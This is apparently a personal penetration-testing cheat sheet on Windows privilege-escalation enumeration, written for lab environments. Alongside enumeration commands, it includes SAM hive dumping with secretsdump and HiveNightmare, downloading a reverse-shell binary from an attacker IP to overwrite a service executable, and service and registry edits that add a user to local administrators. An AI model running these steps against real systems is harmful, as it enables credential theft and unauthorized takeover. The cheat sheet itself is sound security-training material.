# Systeminfo

- Under `Hotfix(s)`, google those `KB` to see when the system was patched
- `OS Version`, `System Boot Time` can also be a good indication
- Under `Network Card(s)` are all the NICs connected. But generally in enterprise env, they use vlan and firewall rule instead of a physical cable

```cmd
systeminfo
```

If `Hotfix(s)` isn't showing anything, maybe because non-admin user is not allowed to see, then we can do this

```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

```cmd
wmic qfe list brief
```

And this

```powershell
Get-HotFix | ft -AutoSize
```

Or this

```powershell
[System.Environment]::OSVersion.Version
```

```sh
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
```

Here is where you can search up build, version, etc...

[Wikipedia](https://en.wikipedia.org/wiki/Windows_10_version_history), [CVEDetails](https://www.cvedetails.com/version-list/26/32238/1/Microsoft-Windows-10.html)

```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

---
# Domain, users, groups, policies

## Domain

Print domain name, and domain controller

```cmd
echo %USERDOMAIN%
echo %logonserver%
```

Find domain controllers

```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

## Users

Current user privilege. see [this](https://www.exploit-db.com/exploits/42556)

```cmd
whoami /priv
```

Current user's groups

```cmd
whoami /groups
```

All local users

```cmd
net user
```

All local users, with description

```powershell
Get-LocalUser
```

## Groups

All local groups

```cmd
net localgroup
```

Group info

```cmd
net localgroup administrators
```

## Password Policy

```cmd
net accounts
```

---

# User Interaction

See more at [06. Privilege Escalation/Windows/User Interactions]({{< relref "06. Privilege Escalation/Windows/User Interactions" >}})

Check if any one else is logged in

```cmd
qwinsta
query user
```

---
# AlwaysInstallElevated

Check permission

```powershell
# should return 0x1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---
# Unattend

```cmd
type C:\Panther\Unattend.xml
```

---
# SAM

## `Windows.old`

No need for permissions

```cmd
dir C:\Windows.old\
```

If the directory exists, go to this location, then transfer `SAM`, `SYSTEM`, `SECURITY` back to our machine

```cmd
cd C:\Windows.old\Windows\system32\config\
```

Transfer those back to our machine and extract hash

```sh
impacket-secretsdump -sam sam -system system -security security local
```

## Weak permission

If we have `(RX)` permission, we good.

```cmd
icacls c:\Windows\System32\config\SAM
icacls c:\Windows\System32\config\SYSTEM
icacls c:\Windows\System32\config\SECURITY
```

[Github Page](https://github.com/GossiTheDog/HiveNightmare)

Download then transfer the binary to target machine

```sh
wget https://github.com/GossiTheDog/HiveNightmare/releases/download/0.6/HiveNightmare.exe
```

Then run on target machine

```cmd
.\HiveNightmare.exe
```

---
# Powershell history

```powershell
(Get-PSReadlineOption).HistorySavePath
```

```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

---
# Installed software

Always uses this first. Painful lesson learned. The others commands might miss some.

```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation

$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation

$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

Is `FileZilla`, `Putty` installed? Run `LaZagne`

```cmd
wmic product get name
```

```powershell
Get-WmiObject -Class Win32_Product |  select Name, Version
```

---
# Environment variable

Look out for `PATH` and `HOMEDRIVE`:

- If `PATH` is modified, and we can write to a path, we can do some DLL injection
- If `HOMEDRIVE` is a shared (network) drive, we can put malware in `USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

```cmd
set
```

```powershell
Get-ChildItem Env: | ft key,value
```

---
# Autorun

Any start up programs?

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

Check our permission over that binary, if can write then replace with a revshell binary, then wait until that user logs in

---
# Scheduled tasks

```cmd
schtasks /query /fo LIST /v
```

```powershell
Get-ScheduledTask | select TaskName,State
```

---
# COM  Objects

IDK wtf am I writing right now, check [this](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/com-hijacking.html) out later and write it more properly

```cmd
reg query HKCR\CLSID /s
```

```powershell
get-acl "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" | fl
```

---
# Services

Listening ports (this command also returns pid of process that opened the port)

```cmd
netstat -ano
```

All services

```cmd
tasklist /svc
```

Filter service with pid

```cmd
tasklist /svc /FI "PID eq 2188"
```

## SharpUp
[Github Page](https://github.com/GhostPack/SharpUp)

[Compiled binary](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/SharpUp.exe)

Download and transfer the binary to target machine

```sh
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/SharpUp.exe
```

Run

```cmd
.\SharpUp.exe audit
```

After running this, you will get lists of vulnerable services, note down the `PATHNAME`.

### Modifiable Service Binaries

`PATHNAME: "C:\Program Files (x86)\PCProtect\SecurityService.exe"`

See our permission over that executable binary

```cmd
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Then replace it with a reverse shell binary

```powershell
wget http://10.10.14.45/revshell.exe -o "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

### Modifiable Services

`Name: WindscribeService`

Download, unzip and transfer [`AccessChk`](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) from sysinternals suite

```sh
wget https://download.sysinternals.com/files/AccessChk.zip
unzip ./AccessChk.zip
```

Check service permission

```cmd
accesschk.exe /accepteula -quvcw WindscribeService
```

Exploit

```cmd
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
sc stop WindscribeService
sc start WindscribeService
```

## Unquoted service path

Search

```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

The binary path should look like this, unquoted

```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

If path is unquoted, windows will attempt to load these binary, in order:

- `C:\Program.exe`
- `C:\Program Files.exe`
- `C:\Program Files (x86)\System.exe`
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`

So we can just place a revshell binary at those locations, if we have permission to write there, and also wait for the service to restart.

Oftentimes, this vulnerability is not exploitable because of that.
## Weak registry permission

Download, unzip and transfer [`AccessChk`](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) from sysinternals suite

```sh
wget https://download.sysinternals.com/files/AccessChk.zip
unzip ./AccessChk.zip
```

Checking for Weak Service ACLs in Registry

```cmd
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

If we have `RW` on a registry, we good. We change the binary path to our command

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "cmd.exe /c net localgroup administrators htb-student /add"
```


---
# Named pipes

## Listing pipes

Download sysinternal [pipelist](https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist), unzip and transfer to target machine

```sh
wget https://download.sysinternals.com/files/PipeList.zip
unzip PipeList.zip
```

Then we can begin enumeration

```cmd
pipelist.exe /accepteula
```

Or we can use powershell `Get-ChildItem` cmdlet and don't have to download anything

```powershell
gci \\.\pipe\
```

## View pipe permissions

Download sysinternal [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk), unzip and transfer to target machine

```sh
wget https://download.sysinternals.com/files/AccessChk.zip
unzip AccessChk.zip
```

Then we can view permission of a pipe we are interested in

```cmd
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

Use this [Metasploit module](https://www.exploit-db.com/exploits/48021) if there is `WindscribeService` pipe, and we can read and write

---
# Misc

```powershell
# Get PS module currently loaded
Get-Module
# Execution policies
Get-ExecutionPolicy -List
```